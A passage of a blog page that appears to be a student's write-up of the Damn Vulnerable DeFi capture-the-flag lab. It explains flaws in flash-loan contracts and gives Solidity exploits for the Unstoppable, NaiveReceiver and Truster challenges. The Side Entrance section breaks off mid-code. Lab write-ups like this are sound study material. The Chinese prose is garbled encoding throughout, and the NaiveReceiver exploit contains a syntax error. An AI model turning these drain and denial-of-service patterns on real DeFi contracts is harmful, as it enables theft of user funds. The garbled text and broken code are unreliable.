<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"heygap.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="ç»§ç»­åˆ·é¢˜">
<meta property="og:type" content="article">
<meta property="og:title" content="blockchain - Damn Vulnerable Defi é¶åœºå¤ç°">
<meta property="og:url" content="http://heygap.github.io/2024/08/26/blockchain%20-%20DVD%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="HeyGap&#39;s_Blog">
<meta property="og:description" content="ç»§ç»­åˆ·é¢˜">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-08-26T12:37:00.000Z">
<meta property="article:modified_time" content="2024-09-01T02:41:45.026Z">
<meta property="article:author" content="HeyGap">
<meta property="article:tag" content="Blockchain">
<meta property="article:tag" content="Smart Contract">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://heygap.github.io/2024/08/26/blockchain%20-%20DVD%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>blockchain - Damn Vulnerable Defi é¶åœºå¤ç° | HeyGap's_Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">HeyGap's_Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Be a positive learner</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>æœç´¢
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="æœç´¢..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/HeyGap" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://heygap.github.io/2024/08/26/blockchain%20-%20DVD%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="HeyGap">
      <meta itemprop="description" content="An undergraduate student of Cybersecurity at SDU.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="HeyGap's_Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          blockchain - Damn Vulnerable Defi é¶åœºå¤ç°
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2024-08-26 20:08:00" itemprop="dateCreated datePublished" datetime="2024-08-26T20:37:00+08:00">2024-08-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2024-09-01 10:09:02" itemprop="dateModified" datetime="2024-09-01T10:41:45+08:00">2024-09-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Blockchain/" itemprop="url" rel="index"><span itemprop="name">Blockchain</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="é˜…è¯»æ¬¡æ•°" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">é˜…è¯»æ¬¡æ•°ï¼š</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <blockquote class="blockquote-center">
ç»§ç»­åˆ·é¢˜
</blockquote>
<span id="more"></span>
<h1 id="ç¯å¢ƒè®¾ç½®">[0] ç¯å¢ƒè®¾ç½®</h1>
<p>æˆ‘æ˜¯ç”¨ forge æ­å»ºçš„é¶åœºï¼Œè²Œä¼¼è¿˜å¯ä»¥ç”¨ npm
ä¹‹ç±»çš„æ­å»ºï¼Œè¿™æ ·åšé¢˜å°±ç›´æ¥ç”¨ web3.js äº¤äº’å°±å¯ä»¥äº†ã€‚</p>
<p>æ ¹æ®<a
target="_blank" rel="noopener" href="https://github.com/theredguild/damn-vulnerable-defi">å®˜æ–¹è¯´æ˜</a>æ­å»ºé¶åœºç¯å¢ƒã€‚forge
å¯èƒ½ç”±äºç½‘ç»œåŸå› ä¼šå¤±è´¥ï¼Œå¤šå®‰è£…å‡ æ¬¡å°±å¥½äº†</p>
<p><code>forge build</code>ä¹‹åï¼Œæœ¬åœ°æœ‰è¿™æ ·å‡ ä¸ªæ–‡ä»¶å¤¹æ¯”è¾ƒé‡è¦ï¼š</p>
<p><code>src</code>: æ¼æ´æºç ã€‚è¦åšçš„é¢˜ç›®éƒ½åœ¨è¿™é‡Œé¢</p>
<p><code>test</code>:
é¢˜è§£ã€‚å¦‚æœæƒ³è¦è§£é¢˜ï¼Œå¿…é¡»è¿è¡Œ<code>forge test --mp test/&lt;é¢˜ç›®åç§°&gt;/&lt;é¢˜ç›®åç§°&gt;.t.sol -vv</code>ï¼Œ-vvæ˜¯ä¸ºäº†æ‰“å°
emit
logï¼Œæ–¹ä¾¿æˆ‘ä»¬è°ƒè¯•ã€‚è€Œæˆ‘ä»¬çš„æ”»å‡»pocå°±è¦å†™åœ¨ä¸Šé¢è¿™ä¸ª.t.solæ–‡ä»¶çš„test_<é¢˜ç›®åç§°>()è¿™ä¸ªå‡½æ•°ä¸­ã€‚</p>
<h1 id="unstoppable">[1] Unstoppable</h1>
<blockquote>
<p>æ¼æ´ç±»å‹ï¼šrevertæ¡ä»¶è®¾ç½®ä¸å½“</p>
</blockquote>
<p>æœ¬é¢˜æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ”»å‡»é—ªç”µè´·åˆçº¦ï¼Œè®©è¿™ä¸ªé—ªç”µè´·åœ¨ä»»ä½•æ—¶å€™éƒ½æ— æ³•å·¥ä½œã€‚</p>
<p>é—ªç”µè´·ï¼ˆFlash
Loanï¼‰æ˜¯ä¸€ç§æ— éœ€æŠµæŠ¼çš„è´·æ¬¾å½¢å¼ï¼Œå¹¿æ³›ç”¨äºå»ä¸­å¿ƒåŒ–é‡‘èï¼ˆDeFiï¼‰é¢†åŸŸã€‚å®ƒçš„ç‰¹åˆ«ä¹‹å¤„åœ¨äºï¼Œè´·æ¬¾çš„æ•´ä¸ªè¿‡ç¨‹ï¼ˆå€Ÿæ¬¾ã€ä½¿ç”¨èµ„é‡‘ã€è¿˜æ¬¾ï¼‰å¿…é¡»åœ¨åŒä¸€ç¬”äº¤æ˜“ä¸­å®Œæˆã€‚å¦‚æœåœ¨äº¤æ˜“ç»“æŸæ—¶è´·æ¬¾æ²¡æœ‰è¢«å¿è¿˜ï¼Œæ•´ä¸ªäº¤æ˜“å°†è¢«å›æ»šï¼Œç¡®ä¿è´·æ¬¾äººä¸ä¼šæ‰¿æ‹…ä»»ä½•é£é™©ã€‚</p>
<p>æˆ‘ä»¬åˆ†æä»£ç ä¹‹åå¯ä»¥å°†æ¼æ´å®šä½åœ¨ flashLoan
å‡½æ•°é‡Œï¼Œå› ä¸ºåªæœ‰å½“è¿™ä¸ªå‡½æ•°å¤±è´¥ï¼Œmonitor é‡Œçš„ checkFlashLoan æ‰ä¼š emit
ä¸€ä¸ª falseã€‚</p>
<p>è€Œæƒ³è¦è®© flashLoan å¤±è´¥ï¼Œæœ‰å››ä¸ªè§¦å‘ç‚¹ï¼š</p>
<ol type="1">
<li><p><code>if (amount == 0) revert InvalidAmount(0);</code></p></li>
<li><p><code>if (address(asset) != _token) revert UnsupportedCurrency();</code></p></li>
<li><p><code>if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();</code></p></li>
<li><p><code>if ( ... != keccak256("IERC3156FlashBorrower.onFlashLoan")) &#123;revert CallbackFailed();&#125;</code></p></li>
</ol>
<p>ç¬¬ä¸€ä¸ªç‚¹ï¼Œamountæ˜¯ä¼ å‚ï¼Œä¸æ˜¯æˆ‘ä»¬æƒ³è¦æ”¹å˜çš„çŠ¶æ€å˜é‡</p>
<p>ç¬¬äºŒä¸ªç‚¹ï¼Œassetåœ¨æ•´ä¸ªåˆçº¦ä¸­é™¤äº†æ„é€ å‡½æ•°æœ‰æ”¹å˜ä»¥å¤–ï¼Œæ²¡æœ‰æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ç‚¹</p>
<p>ç¬¬å››ä¸ªç‚¹ï¼Œè¿™ä¸ªå‡½æ•°ç­¾åä¸æ­£ç¡®ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬æ— æ³•æ§åˆ¶çš„ã€‚</p>
<p>æ‰€ä»¥å¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬éœ€è¦æ”»å‡»ç¬¬ä¸‰ç‚¹ã€‚ä½†ä¸ºä»€ä¹ˆä¼šè«åå…¶å¦™æœ‰ç¬¬ä¸‰ç‚¹è¿™ä¸ªé™åˆ¶ï¼Ÿæˆ‘ä»¬ä»”ç»†æ¥åˆ†æä¸€ä¸‹ï¼š</p>
<p>é¦–å…ˆï¼ŒbalanceBefore æ˜¯ totalAssets() çš„è¿”å›å€¼ï¼Œassets
æ˜¯é—ªç”µè´·åˆçº¦é‡Œå‰©ä½™çš„ä»£å¸æ•°ç›®ï¼ˆæ³¨æ„è¿™é‡Œæ˜¯ä»£å¸ï¼Œè€Œä¸æ˜¯å®é™…çš„
etherï¼‰ï¼Œsupply æ˜¯é—ªç”µè´·åˆçº¦èƒ½ä¾›ç»™çš„æ•°ç›®ä¸Šé™ï¼Œä¹Ÿå°±æ˜¯ä¸€å¼€å§‹ç»™çš„
1_000_000e18 ä¸ª ERC20 tokenï¼ˆDVTï¼‰ï¼Œè¿™ä¸ªæ•°ç›®æ˜¯ä¸ä¼šå˜çš„ã€‚</p>
<p>æˆ‘ä»¬ä¸€å¼€å§‹æ‹¥æœ‰ 10 ä¸ª DVTï¼Œå¦‚æœç»™é—ªç”µè´·åˆçº¦è½¬ 1 ä¸ª DVT
çš„è¯ï¼Œè¿™é‡Œçš„convertToShares å‡½æ•°è¿”å›å€¼å°±æ°¸è¿œæ˜¯ 999999999999999999999999
äº†,æ­¤æ—¶å°±æ°¸è¿œå…³åœè¿™ä¸ªé—ªç”µè´·äº†ã€‚</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function test_unstoppable() public checkSolvedByPlayer &#123;</span><br><span class="line">    require(vault.convertToShares(vault.totalSupply()) == vault.totalAssets(),&quot;not equal&quot;);</span><br><span class="line">    emit log_named_uint(&quot;Total Supply&quot;, vault.totalSupply());</span><br><span class="line">    emit log_named_uint(&quot;Total Assets&quot;, vault.totalAssets());</span><br><span class="line">    require(token.transfer(address(vault), 1 wei));</span><br><span class="line">    emit log_named_uint(&quot;calc result&quot;, vault.convertToShares(vault.totalSupply()));</span><br><span class="line">    emit log_named_uint(&quot;Total Supply&quot;, vault.totalSupply());</span><br><span class="line">    emit log_named_uint(&quot;Total Assets&quot;, vault.totalAssets());</span><br><span class="line">    require(vault.convertToShares(vault.totalSupply()) != vault.totalAssets(),&quot;equal&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘çªç„¶æ„è¯†åˆ°è¿™ä¸ªé—ªç”µè´·æ˜¯ä¸æ˜¯åªè¦æ¥æ”¶åˆ° fee ç«‹åˆ»å°± dead äº†ã€‚ã€‚</p>
<h1 id="naivereceiver">[2] NaiveReceiver</h1>
<blockquote>
<p>æ¼æ´ç±»å‹ï¼šæƒé™è®¾ç½®é”™è¯¯</p>
</blockquote>
<p>è¿™é“é¢˜è¦æ±‚æˆ‘ä»¬æŠŠ receiver é‡Œçš„ 10 WETH å’Œ pool é‡Œçš„ 1000 WETH
å…¨è½¬ç§»åˆ° recovery è´¦æˆ·ä¸­ã€‚æœ€å isSolved æœ‰å››æ¡é™åˆ¶ï¼š</p>
<ol type="1">
<li><p>player è°ƒç”¨çš„äº¤æ˜“å°äºç­‰äº 2 æ¡</p></li>
<li><p>receiver çš„ weth ä½™é¢ä¸º0</p></li>
<li><p>pool çš„ weth ä½™é¢ä¸º0</p></li>
<li><p>recovery çš„ weth ä½™é¢ä¸º 1010</p></li>
</ol>
<p>å¾ˆæ˜æ˜¾èƒ½çœ‹åˆ° NaiveReceiverPool åˆçº¦ä¸­çš„ withdraw
æƒé™è®¾ç½®çš„ä¸å¯¹ï¼Œä»»ä½•äººéƒ½å¯ä»¥è°ƒç”¨è¿™ä¸ªå‡½æ•°å–æ¬¾ã€‚</p>
<p>ä½†æ–°ç‰ˆæœ¬çš„ solidity feature å¡äº†æˆ‘å¥½ä¹…...åŸæ¥ 0.8.0
ä¹‹åçš„ä¸Šæº¢/ä¸‹æº¢éƒ½ä¼šè‡ªåŠ¨æ£€æµ‹äº†..ä¹Ÿå°±æ˜¯è¯´æ²¡åŠæ³•ç›´æ¥é€šè¿‡withdrawç›´æ¥ææ¬¾ã€‚</p>
<p>ä½†è¿™ä¸ªåˆçº¦è¿˜è‡ªå·±å®ç°äº† _msgSender å‡½æ•°ï¼Œå½“è°ƒç”¨è€…æ˜¯ trustedForwarder
æ—¶ï¼Œ_msgSender å‡½æ•°å°±ä¼šå°† msg.dataçš„ æœ€å 20byte
å½“ä½œåœ°å€è¿”å›ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¿…é¡»è¦é€šè¿‡ trustedForwarder çš„ execute
æ–¹æ³•æ¥é—´æ¥è°ƒç”¨ withdrawã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬çŸ¥é“ deposits[deployer] æ˜¯æœ‰ 1000WETH
çš„ï¼Œdeposits[receiver] ä¹Ÿæœ‰
10WETHï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æœ‰å¦‚ä¸‹ä¸¤ç§æ–¹æ³•æ¥è½¬èµ°è¿™ä¸¤ä¸ªåˆçº¦çš„ WETHï¼š</p>
<p>ç¬¬ä¸€ç§æ˜¯é€šè¿‡é—ªç”µè´·çš„ feeï¼ŒæŠŠ receiver é‡Œçš„ 10WETH è½¬ç§»åˆ° deployer
ä¸­ï¼Œç„¶åä¸€å£æ°”æå¹²å‡€ã€‚</p>
<p>ç¬¬äºŒç§æ˜¯æå–ä¸€æ¬¡ deployerï¼Œæå–ä¸€æ¬¡ receiver</p>
<p>ä½†æ— è®ºä»¥ä¸Šå“ªä¸€ç§æ–¹æ³•ï¼Œéƒ½éœ€è¦ç»•è¿‡ä¸Šè¿°çš„ç¬¬ä¸€æ¡é™åˆ¶ï¼šäº¤æ˜“æ•°å°äºç­‰äº 2
æ¡ï¼Œè€Œè¿™å°±ç”¨åˆ°äº† Multicall åˆçº¦é‡Œçš„ multicall æ–¹æ³•äº†ã€‚</p>
<p>æˆ‘ä»¬çœ‹ç¬¬ä¸€ç§æ–¹æ³•ï¼šè°ƒç”¨ 10 æ¬¡ flashLoanï¼Œäº¤ 10 æ¬¡ 1WETH
çš„æ‰‹ç»­è´¹ï¼Œå°±èƒ½æŠŠ WETH æ±‡æ€»åœ¨ deployer çš„ deposits ä¸­ã€‚ä¸è¿‡è¿™ 10
æ¬¡äº¤æ˜“éœ€è¦ç”¨ multicall
ä¸€èµ·æ‰§è¡Œï¼Œä¸ç„¶ä¼šè¶…å‡ºç¬¬ä¸€æ¡é™åˆ¶çš„è¦æ±‚ã€‚ç„¶åï¼Œæˆ‘ä»¬å†é€šè¿‡ execute è°ƒç”¨
withdrawï¼Œå°±å¯ä»¥æŠŠè¿™é‡Œé¢çš„å­˜æ¬¾å…¨éƒ½è½¬åˆ° recovery
ä¸­äº†ã€‚ä¸è¿‡è¿™é‡Œæˆ‘ä»¬é€‰æ‹©æŠŠä¸¤æ¡äº¤æ˜“åˆå¹¶ä½œä¸€æ¡ï¼Œä¹Ÿå°±æ˜¯æŠŠ withdraw çš„ abi
ç¼–ç ä¸å‰10æ¡ flashLoan çš„ç¼–ç åˆåœ¨ä¸€èµ·ã€‚expå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function test_naiveReceiver() public checkSolvedByPlayer &#123;</span><br><span class="line">    bytes[] memory callData = new bytes[](11);</span><br><span class="line">    for (uint256 i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">        callData[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, bytes(&quot;&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    callData[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery)));</span><br><span class="line">        bytes32(uint256(uint160(deployer))),</span><br><span class="line">    );</span><br><span class="line">    bytes memory multicallData = abi.encodeCall(Multicall.multicall, callData);</span><br><span class="line">    BasicForwarder.Request memory request = BasicForwarder.Request(&#123;</span><br><span class="line">        from: player,</span><br><span class="line">        target: address(pool),</span><br><span class="line">        value: 0,</span><br><span class="line">        gas: 1e7,</span><br><span class="line">        nonce: forwarder.nonces(player),</span><br><span class="line">        data: multicallData,</span><br><span class="line">        deadline: block.timestamp + 1 days</span><br><span class="line">    &#125;);</span><br><span class="line">    bytes32 requestHash = keccak256(</span><br><span class="line">        abi.encodePacked(</span><br><span class="line">            &quot;\x19\x01&quot;,</span><br><span class="line">            forwarder.domainSeparator(),</span><br><span class="line">            forwarder.getDataHash(request)</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);</span><br><span class="line">    bytes memory signature = abi.encodePacked(r, s, v);</span><br><span class="line">    forwarder.execute(request, signature);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="truster">[3] Truster</h1>
<p>è¿™é“é¢˜çš„åˆçº¦ä»£ç é‡å¾ˆå°ï¼Œå°±å®ç°äº†ä¸€ä¸ªé—ªç”µè´·ï¼Œè®©æˆ‘ä»¬é€šè¿‡é—ªç”µè´·çš„äº¤æ˜“è¿‡ç¨‹ï¼ŒæŠŠåˆçº¦é‡Œçš„é’±éƒ½è½¬èµ°ã€‚</p>
<p>æƒ³è½¬èµ°ä»£å¸ä¸€å…±æœ‰ä¸¤ç§æ–¹æ³•ï¼Œç¬¬ä¸€ç§æ˜¯ç›´æ¥è®©å¯ä¿¡ç”¨æˆ·è°ƒç”¨ transfer
å‡½æ•°ï¼Œç¬¬äºŒç§æ˜¯è®©æ¶æ„ç”¨æˆ·æˆä¸ºå¯ä¿¡ç”¨æˆ·åï¼Œå†é€šè¿‡æ¶æ„ç”¨æˆ·è½¬è´¦ã€‚ç”±äº
flashLoan è®¾ç½®äº†ä»£å¸æ•°ç›®æ£€æŸ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬æ²¡åŠæ³•åœ¨ flashLoan çš„
target.functionCall ä¸­ç›´æ¥è°ƒç”¨ transferï¼Œä½†æˆ‘ä»¬å¯ä»¥é‡‡å–
approveï¼Œè®©æ¶æ„åˆçº¦æœ‰æ“æ§ä»£å¸çš„æƒé™ã€‚</p>
<p>exp å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">contract TrusterExploiter &#123;</span><br><span class="line">    TrusterLenderPool public pool;</span><br><span class="line">    DamnValuableToken public token;</span><br><span class="line">    address recovery;</span><br><span class="line"></span><br><span class="line">    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) &#123;</span><br><span class="line">        pool = _pool;</span><br><span class="line">        token = _token;</span><br><span class="line">        recovery = _recovery;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public returns (bool) &#123;</span><br><span class="line">        require(pool.flashLoan(</span><br><span class="line">            0,</span><br><span class="line">            address(this),</span><br><span class="line">            address(token),</span><br><span class="line">            abi.encodeCall(token.approve,(address(this), 1_000_000e18))</span><br><span class="line">        ));</span><br><span class="line">        token.transferFrom(address(pool), address(this), 1_000_000e18);</span><br><span class="line">        token.transfer(recovery, 1_000_000e18);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TrusterChallenge is Test &#123;</span><br><span class="line">    ...</span><br><span class="line">    function test_truster() public checkSolvedByPlayer &#123;</span><br><span class="line">        TrusterExploiter exploiter = new TrusterExploiter(pool, token, recovery);</span><br><span class="line">        require(exploiter.attack());</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="side-entrance">[4] Side Entrance</h1>
<p>è¿™é¢˜è·Ÿä¸Šä¸€é¢˜å¾ˆç›¸ä¼¼ï¼Œä½†æ˜¯ä¸Šä¸€é¢˜ç”¨çš„æ˜¯ä»£å¸ï¼Œè¿™ä¸€é¢˜å°±å®Œå®Œå…¨å…¨ç”¨çš„ ether
äº†ã€‚ä¸è¿‡æˆ‘ä»¬å¯ä»¥åœ¨
<code>IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</code>
é‡Œå°†è´·æ¬¾æ¥çš„é’±å†ç”¨ deposit å­˜å…¥ SideEntranceLenderPool
åˆçº¦ä¸­ï¼Œè¿™æ ·ä¸ä»…ä¸ä¼šå½±å“ RepayFailedï¼Œè¿˜å¯ä»¥è®©
balances[IFlashLoanEtherReceiver] = 1000ï¼Œä¹‹åæˆ‘ä»¬ withdraw
å³å¯æˆåŠŸææ¬¾ï¼Œç„¶åè½¬è´¦ç»™ recovery å°±å¥½äº†ã€‚exp å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 